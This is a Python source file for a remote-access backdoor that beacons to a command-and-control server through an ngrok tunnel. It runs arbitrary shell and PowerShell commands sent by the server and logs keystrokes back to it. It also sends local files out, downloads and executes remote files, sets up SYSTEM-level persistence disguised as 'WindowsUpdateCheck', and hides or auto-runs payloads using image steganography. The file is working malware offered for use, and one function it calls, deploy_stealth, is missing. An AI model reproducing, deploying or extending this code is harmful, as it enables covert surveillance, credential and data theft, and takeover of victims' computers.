"""
This is the backdoor client that will be deployed on target machines. It connects to a C2 server, executes commands, 
and can perform keylogging, file upload/download, and shell command execution. The client will attempt to maintain 
persistence by reconnecting if the connection is lost.
"""

import getpass
import os
import socket
import platform
import sys
import time
import threading
import subprocess
import base64
import pynput
import urllib.request
import winreg as reg
import zlib
from PIL import Image
import numpy as np
import shutil
from pynput import keyboard

# If the free version of ngrok is used, the port will change each time ngrok is activated
address = "0.tcp.jp.ngrok.io" # address
port = 18642 # port 
glbSock = None # Stores the sock 

keyBuffer = "" # String to store keystrokes for keylogging
loggerIsRunning = False # Stores whether the keylogger is working (will be used to stop the keylogger)


# Handles the connection of the client to the C2 server through the socket library and tcp server.
# Preconditions: address and port are set, ngrok tcp tunnel is active, and outbound network access is available.
# Postconditions: When connected, sends a beacon and current working directory, then starts command handling.
# Pseudocode:
# 1. Loop forever
# 2. Create a TCP socket
# 3. Connect to the listener at (address, port)
# 4. Send beacon and current working directory
# 5. Spawn command handler thread, wait for it to finish
# 6. On exception, wait 10 seconds and retry
def connect_client():
  global glbSock
  # Infinite loop to keep trying to connect to the server
  while True:
    try:
      # Creates a socket object as clientSocket
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSocket:
        # Connect to server
        clientSocket.connect((address, port))
        send_beacon(clientSocket) # Send beacon to server to indicate that client is alive
        clientSocket.send(f"/{os.getcwd()}: ".encode("utf-8"))
        glbSock = clientSocket
        handler = threading.Thread(target = command_handler, args=(glbSock,), daemon = True)
        handler.start()
        handler.join()
    except Exception as e:
      print(f'[*] Connection failed: {e}. Trying in 10 seconds...')
      # Delay for 10 sec
      time.sleep(10)

# Sends the current machine and user information to the listener.
# Preconditions: sock is an open and connected socket.
# Postconditions: Beacon message is encoded and sent over the socket.
# Pseudocode:
# 1. Format node name, username, privilege, and OS into a beacon string
# 2. Send the beacon string over sock
def send_beacon(sock):
  beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
  sock.send(beacon.encode("utf-8"))

# Self destruct function to cleanly exit the backdoor when a KILL command is received.
# Preconditions: sock is a connected socket, and the KILL command is received.
# Postconditions: Sends acknowledgment to listener and terminates the process.
# Pseudocode:
# 1. Turn off keylogger if runnning
# 2. Print shutdown message and send KILL_ACK to listener
# 3. Wait briefly to ensure message is sent
# 4. Exit the process using os._exit(0) for a clean shutdown
def self_destruct(sock):
    try:
        global loggerIsRunning
        loggerIsRunning = False 
        
        print("[!] KILL command received. Shutting down backdoor...")
        sock.send(b"KILL_ACK|Backdoor shutting down...")
        time.sleep(1)
        
        os._exit(0) 

    except Exception as e:
        print(f"[!] Error during shutdown: {e}")
        os._exit(1)

###
### Keylogger functions
###

# pynput callback for each keypress event.
# Preconditions: pynput keyboard listener is running, loggerIsRunning indicates active logging, and glbSock may be set.
# Postconditions: The key is added to the buffer, and when the buffer reaches 100 characters, it is sent to the listener.
# Pseudocode:
# 1. If logging is disabled, clear the buffer and return
# 2. Append character or special key placeholder to keyBuffer
# 3. If buffer length >= 100 and socket exists, send KEYLOG data and reset buffer
# 4. On send failure, reset buffer to avoid stale data
def on_press(key):
    global keyBuffer, glbSock, loggerIsRunning
    
    # Stops the logger and resets for next time
    if not loggerIsRunning:
      keyBuffer = ""
      return
    
    try:
      keyBuffer += key.char
    except AttributeError:
      keyBuffer += f" [SP: {key}] "

    if len(keyBuffer) >= 100 and glbSock is not None: # Send keystrokes every 100 characters
      try:
        glbSock.send(f"KEYLOG|{keyBuffer}".encode("utf-8"))
        # Clear keyBuffer after sending
        keyBuffer = ""
      except:
        keyBuffer = ""

# Activates the pynput keylogger and updates global socket and logger state.
# Preconditions: sock is a connected socket and pynput is available.
# Postconditions: keyboard.Listener starts and sends keystrokes back over the socket until stopped.
# Pseudocode:
# 1. Store sock in glbSock
# 2. Set loggerIsRunning to True
# 3. Start the pynput keyboard listener and block until it stops
def start_keylogger(sock):
  #updates sock again before using on_press && loggerIsRunning is set to True
  global glbSock, loggerIsRunning
  glbSock= sock
  loggerIsRunning = True
  print("[*] Keylogger started")
  #Starts on_press
  with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
###
### Shell command function
###

# Executes a received shell command or directory change and sends the result back to the listener.
# Preconditions: command is a non-empty decoded string and sock is a connected socket.
# Postconditions: Sends CMD_RES with base64 output or CMD_ERR if execution fails.
# Pseudocode:
# 1. If command starts with "cd ", change directory and prepare a result string
# 2. Otherwise run the command in PowerShell on Windows or shell on other systems
# 3. Capture stdout/stderr and replace empty output with a placeholder
# 4. Encode result in base64 and send CMD_RES
# 5. Handle timeouts and execution exceptions
def execute_command(command, sock):
    try:
    
      # Special handling for "cd" command
      if command.startswith("cd "):
        try:
          os.chdir(command[3:].strip())
          result = f"[{os.getcwd()}]"
        except Exception as e:
          result = f"Error changing directory: {e}"
      
      # Normal shell commands (whoami, hostname, ipconfig, dir, etc.)
      else:
        if os.name == "nt":
          result_obj = subprocess.run(["powershell", "-Command", command], 
                                        capture_output=True, timeout=15, text=True)
        else:
          result_obj = subprocess.run(command, shell=True, capture_output=True, timeout=15, text=True)
        
        result = result_obj.stdout + result_obj.stderr
        if not result.strip():
          result = "(No output)"

      # Send output back to listener
      encoded = base64.b64encode(result.encode("utf-8")).decode("utf-8")
      sock.send(f"CMD_RES|{encoded}".encode("utf-8"))
      print(f"[+] Executed: {command}")

    except subprocess.TimeoutExpired:
      sock.send(b"CMD_ERR|Command timed out")
    except Exception as e:
      sock.send(f"CMD_ERR|Error: {str(e)}".encode("utf-8"))

###
### File download and upload functions
###

# Downloads a file from the specified URL and optionally executes it on the target machine.
# Preconditions: full_cmd contains a valid URL and sock is a connected socket.
# Postconditions: File is saved to the current working directory, and if requested, executed and status messages are sent back.
# Pseudocode:
# 1. Parse URL and check for "-e" flag
# 2. Download file to current directory
# 3. Send FILE_OK when download completes
# 4. If execute_after is True, launch the file and send EXEC_OK or EXEC_ERR
# 5. On failure, send FILE_ERR
def download_execute(full_cmd, sock):
  try:
    # Split command to check for -e flag
    parts = full_cmd.split()
    url = parts[0]
    execute_after = "-e" in parts   # Check if -e flag is present

    print(f"[*] Downloading file from: {url}")

    # Extract filename from URL
    filename = url.split('/')[-1].split('?')[0] if '/' in url else "downloaded_file.exe"
    file_path = os.path.join(os.getcwd(), filename)

    # Download the file
    urllib.request.urlretrieve(url, file_path)
    print(f"[+] Downloaded: {file_path}")

    sock.send(f"FILE_OK|Downloaded: {filename}".encode("utf-8"))

    # Auto-execute only if -e flag was given
    if execute_after:
      try:
        subprocess.Popen(file_path, shell=True)
        print(f"[+] Executed: {file_path}")
        sock.send(f"EXEC_OK|File executed: {filename}".encode("utf-8"))
      except Exception as exec_err:
        print(f"[!] Execution failed: {exec_err}")
        sock.send(f"EXEC_ERR|{str(exec_err)}".encode("utf-8"))
    else:
      print(f"[*] File saved but not executed (use -e to execute)")

  except Exception as e:
    error_msg = f"Download failed: {str(e)}"
    print(f"[!] {error_msg}")
    sock.send(f"FILE_ERR|{error_msg}".encode("utf-8"))

# Uploads a local file from the target machine back to the listener.
# Preconditions: filename points to an existing file and sock is a connected socket.
# Postconditions: Sends UPLOAD_DATA with file contents or UPLOAD_ERR if the file is missing or cannot be read.
# Pseudocode:
# 1. Build the full file path from the current working directory
# 2. Verify the file exists
# 3. Read the file contents as text and send the upload packet
# 4. Handle read/send errors and notify listener
def upload_file(filename, sock):
  try:
    full_path = os.path.join(os.getcwd(), filename)
    
    if not os.path.exists(full_path):
      sock.send(f"UPLOAD_ERR|File not found: {filename}".encode("utf-8"))
      print(f"[!] File not found: {full_path}")
      return

    print(f"[*] Uploading: {full_path}")

    with open(full_path, "r") as f:
      file_data = f.read()

    sock.send(f"UPLOAD_DATA|{filename}|{len(file_data)}|{file_data}".encode("utf-8"))
    
    print(f"[+] Uploaded: {filename} ({len(file_data)} bytes)")

  except Exception as e:
    error_msg = f"Upload failed: {str(e)}"
    print(f"[!] {error_msg}")
    sock.send(f"UPLOAD_ERR|{error_msg}".encode("utf-8"))

###
### Persistence and Stealth
###

# Installs persistence by creating a scheduled task that runs the backdoor at system startup with SYSTEM privileges.
# Preconditions: sock is a connected socket, and the backdoor has permission to create scheduled tasks
# Postconditions: A scheduled task is created, and a success or error message is sent back to the listener.
# Pseudocode:
# 1. Get the full path of the current executable
# 2. Define a task name (disguised as a legitimate Windows process)
# 3. Create a command to establish a scheduled task that runs at boot with SYSTEM privileges
# 4. Execute the command and handle the result
# 5. Send success or error message back to the listener
def install_persistence(sock):
  try:
    exe_path = os.path.abspath(sys.argv[0])
    task_name = "WindowsUpdateCheck"
    
    cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onstart /ru SYSTEM /f /rl HIGHEST'
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
    
    if result.returncode == 0:
      print(f"[+] Persistence installed successfully via Scheduled Task: {task_name}")
      sock.send(f"PERSIST_OK|Scheduled Task created: {task_name}".encode("utf-8"))
    else:
      print(f"[!] schtasks failed: {result.stderr}")
      sock.send(f"PERSIST_ERR|{result.stderr}".encode("utf-8"))

  except Exception as e:
    error_msg = f"Persistence failed: {str(e)}"
    print(f"[!] {error_msg}")
    sock.send(f"PERSIST_ERR|{error_msg}".encode("utf-8"))



# Hides a payload file inside a carrier image using Least Significant Bit (LSB) steganography.
# Preconditions: payload_path and carrier_path point to valid files, output_path is writable, and carrier is a PNG image.
# Postconditions: Creates a new PNG image that visually looks identical to the original but contains the hidden payload in the least significant bits of the pixels.
# Pseudocode:
# 1. Read and compress the payload
# 2. Convert compressed payload to binary
# 3. Embed each bit into the LSB of RGB pixel values
# 4. Save the modified image as PNG
def hide_file_in_image(payload_path, carrier_path, output_path):
  try:
    with open(payload_path, "rb") as f:
      original_data = f.read()

      # Compress to reduce required image size
      compressed = zlib.compress(original_data, level=9)
      
      # Add length header + data + end marker
      to_hide = len(compressed).to_bytes(4, 'big') + compressed + b"###END###"
      binary = ''.join(format(byte, '08b') for byte in to_hide)

      img = Image.open(carrier_path)
      data = np.array(img)

      idx = 0
      for i in range(data.shape[0]):
        for j in range(data.shape[1]):
          for k in range(3):  # R, G, B
            if idx < len(binary):
              data[i, j, k] = (data[i, j, k] & ~1) | int(binary[idx])
              idx += 1
            else:
              break
          if idx >= len(binary): break
        if idx >= len(binary): break

      Image.fromarray(data).save(output_path, format="PNG")
      print(f"[+] Payload hidden in {output_path} ({len(compressed)/1024:.1f} KB compressed)")
      return True

  except Exception as e:
    print(f"[-] Hide failed: {e}")
    return False

# Extracts a hidden payload from an image that was embedded using LSB steganography.
# Preconditions: image_path points to a PNG containing LSB hidden data.
# Postconditions: Extracts and decompresses the payload, saves it to output_filename, and optionally executes it.
# Pseudocode:
# 1. Read all pixel LSBs and build binary string
# 2. Look for end marker to know when payload ends
# 3. Convert binary back to bytes, decompress, and save
# 4. Auto-run if requested
def extract_from_image(image_path, output_filename="extracted.exe", auto_run=False):
  try:
    img = Image.open(image_path)
    data = np.array(img)

    binary_data = ""
    end_marker = ''.join(format(byte, '08b') for byte in b"###END###")

    print(f"[*] Extracting hidden payload from {image_path}...")

    for i in range(data.shape[0]):
      for j in range(data.shape[1]):
          for k in range(3):
            binary_data += str(data[i, j, k] & 1)

            if end_marker in binary_data[-len(end_marker):]:
              all_bytes = bytes(int(binary_data[m:m+8], 2) 
                for m in range(0, len(binary_data)-len(end_marker), 8))
              
              payload_size = int.from_bytes(all_bytes[:4], 'big')
              compressed = all_bytes[4:4+payload_size]
              payload = zlib.decompress(compressed)

              with open(output_filename, "wb") as f:
                f.write(payload)

              print(f"[+] Successfully extracted {len(payload)/1024:.1f} KB")

              if auto_run:
                try:
                  subprocess.Popen([output_filename], shell=True)
                  print(f"[+] Auto-executed {output_filename}")
                except Exception as e:
                  print(f"[!] Auto-run failed: {e}")
              return output_filename

    print("[-] End marker not found - extraction failed")
    return None

  except Exception as e:
    print(f"[-] Extraction error: {e}")
    return None




###
### Command Handler
###

# Handles commands received from the listener and dispatches them to the appropriate action.
# Preconditions: sock is a connected socket and required libraries are imported.
# Postconditions: KEYLOG, DOWNLOAD, UPLOAD, and shell commands are handled; disconnects when the socket closes.
# Pseudocode:
# 1. Loop and read data from sock
# 2. Decode the received command
# 3. If command is KEYLOG_START, begin keylogging
# 4. If command is KEYLOG_STOP, stop keylogging
# 5. If command starts with DOWNLOAD:, call download_execute
# 6. If command starts with UPLOAD:, call upload_file
# 7. Otherwise execute as a shell command
# 8. On exception, print error and break the loop
def command_handler(sock):
  global loggerIsRunning
  while True:
    try:
      data = sock.recv(4096)

      # When no inut
      if not data: break
      
      cmd = data.decode("utf-8", errors="ignore").strip()
      print(f"[*] Received: {cmd}")
      
      # Keylogging command
      # Approach: Create a string that logs all the keystrokes, then send the string back to the user periodically.
      if cmd.startswith("KEYLOG_START"):
        keylog_thread = threading.Thread(target=start_keylogger, args = (sock,),daemon=True)
        keylog_thread.start()
        sock.send(b"KEYLOG| STARTED")
      elif cmd == "KEYLOG_STOP":
        global loggerIsRunning
        loggerIsRunning = False
        sock.send(b"KEYLOG| STOPPED")

      #Downloading and executing a file (-e) from a specified URL command
      elif cmd.startswith("DOWNLOAD:"):
        url = cmd[9:].strip()
        if url:
          download_execute(url, sock)
        else:
          sock.send(b"CMD_ERR| No URL provided for download and execute")

      # Uploading a file from the target machine to the client's machine command
      elif cmd.startswith("UPLOAD:"):
        filename = cmd[7:].strip()
        if filename:
          upload_file(filename, sock)
        else:
          sock.send(b"CMD_ERR| No filename provided for upload")

      # Persistence command
      elif cmd.startswith("PERSIST"):
        install_persistence(sock)

      
      # Stealth deployment command
      elif cmd.startswith("HIDE_STEG"):
        try:
          parts = cmd.split(maxsplit=3)
          if len(parts) < 4:
            sock.send(b"STEG_ERR|Usage: HIDE_STEG <payload.exe> <carrier.png> <output.png>")
            return
                
          payload_file = parts[1]
          carrier_img = parts[2]
          output_img = parts[3]
          
          if hide_file_in_image(payload_file, carrier_img, output_img):
            sock.send(f"STEG_OK|Payload successfully hidden in {output_img}".encode("utf-8"))
          else:
            sock.send(b"STEG_ERR|Failed to hide payload")
                
        except Exception as e:
          sock.send(f"STEG_ERR|HIDE_STEG error: {str(e)}".encode("utf-8"))

      # Extraction command
      elif cmd.startswith("EXTRACT_STEG"):
        try:
          # Usage: EXTRACT_STEG <image_with_payload> [output_filename] [--run]
          parts = cmd.split()
          if len(parts) < 2:
            sock.send(b"STEG_ERR|Usage: EXTRACT_STEG <hidden_image.png> [output.exe] [--run]")
            return
            
          image_path = parts[1]
          output_filename = parts[2] if len(parts) > 2 else "extracted.exe"
          auto_run = "--run" in cmd.lower() or "-run" in cmd.lower()
          
          result = extract_from_image(image_path, output_filename, auto_run)
          
          if result:
            sock.send(f"STEG_OK|Payload extracted successfully as {result}".encode("utf-8"))
          else:
            sock.send(b"STEG_ERR|Failed to extract payload")
              
        except Exception as e:
          sock.send(f"STEG_ERR|EXTRACT_STEG error: {str(e)}".encode("utf-8"))


      # Stealth deployment command
      elif cmd.startswith("DEPLOY_STEALTH"):
        parts = cmd.split(maxsplit=3)
        if len(parts) < 4:
          sock.send(b"STEALTH_ERR|Usage: DEPLOY_STEALTH <new_name> <target_dir> <carrier_image>")
          return
        
        new_name = parts[1]
        target_dir = parts[2]
        carrier_img = parts[3]
        
        deploy_stealth(new_name, target_dir, carrier_img, sock)

      # Self destruct command
      elif cmd.startswith("KILL"):
        self_destruct(sock)
        return 

      # Shell Command
      else:
        execute_command(cmd, sock)

      # Error Handling
    except Exception as e:
      print(f'[*] Error receiving data: {e}')
      break





if __name__ == "__main__":
  connect_client()
